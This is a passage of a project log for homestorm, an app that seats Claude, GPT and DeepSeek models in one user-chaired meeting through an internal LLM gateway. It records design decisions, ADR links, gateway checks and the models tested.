  - D5 fixed templates: [ADR 0013](adr/0013-intro-and-floor-note-templates.md).
  - D6 closed: how llmgw signs in is llmgw's business.
  - Dev runs on localhost until M8.
- **llmgw gap found:** its streams carry no `usage`, `cost_usd` or `req_id`, and it ignores an incoming
  `X-Request-Id`. homestorm reads those fields if they ever appear and saves a marked estimate meanwhile
  (ADR 0009). A small llmgw follow-up would close it; llmgw itself is out of scope here.
- **Repo created and made public:** `autumnfallenwang/homestorm`, with README, plan, this log, ADRs 0001–0008 and the
  two design docs. It's plain Markdown docs only: no devkit scaffold, hooks or project skills. Account-specific details
  (plans, balances, allowance numbers, how llmgw signs in, private links) live in the gitignored `private/notes.md`.
- **Name decided:** homestorm, as in brainstorming together ([ADR 0008](adr/0008-name-homestorm.md)).
- **UI mockup approved:** a three-pane meeting UI plus a controls-and-states board
  ([ADR 0007](adr/0007-three-pane-meeting-ui.md)).
- **Meeting control designed** ([meeting-control-design.md](meeting-control-design.md)):
  - the user is chair and participant;
  - seats speak only when given the floor;
  - blind and in-turn rounds;
  - a single visibility rule;
  - control lives in server code behind one action API; etiquette lives in the prompts
    ([ADR 0005](adr/0005-chair-controlled-meetings.md), [ADR 0006](adr/0006-control-in-code-etiquette-in-prompts.md)).
- **Chat-wrapper research done** ([chat-wrapper-research.md](chat-wrapper-research.md)):
  - build our own instead of forking ([ADR 0003](adr/0003-build-our-own-app.md));
  - a per-seat view of one shared transcript, based on LobeHub's group-chat design
    ([ADR 0004](adr/0004-per-seat-view-of-shared-transcript.md)).
- **llmgw 0.5.0 verified in production** (commit `e36e08c`):
  - models not on the plan report `unavailable` in `/v1/limits`;
  - usage log lines share `req_id` with the request line;
  - provider names in logs match the API;
  - `GET /` returns the version and commit.
  - One correction: `req_id` isn't a Loki label. Query `{namespace="llmgw"} | json | req_id="<id>"`.
- **DeepSeek wired into llmgw:** `deepseek-v4-pro` and `deepseek-flash` work with plain and `deepseek/…` names, normal
  and streaming. `deepseek-v4-flash` is a 404 at the gateway (good: exact names only).
- **llmgw `/v1/limits` checked** for all three paid sources: weekly windows for Claude (Fable models have their own),
  a monthly window for GPT, and a prepaid balance for DeepSeek.
- **GPT models tested:**
  - **working:** `gpt-6-luna`, `gpt-5.6-terra`, `gpt-5.6-luna`;
  - catalog models that aren't on the current plan return 404.
- **llmgw behavior confirmed from its source:**
  - exact model match only, no fallback to other models;
  - the one exception is the image fallback, when a text-only model receives an image.

## 2026-11-01

- **Idea:** one room where Claude, GPT and Gemini answer the same question with the user as chair, instead of
  copy-pasting between web apps. Existing open-source options surveyed; none does chair-controlled meetings well.
- **llmgw found** at `http://llmgw.arch.internal`. All seven Claude 5.x models work, normal and streaming
  (`claude-fable-5-1`, `claude-opus-5-5`, `claude-sonnet-5-5`, `claude-haiku-5-5`, `claude-fable-5`, `claude-opus-5`,
  `claude-sonnet-5`).
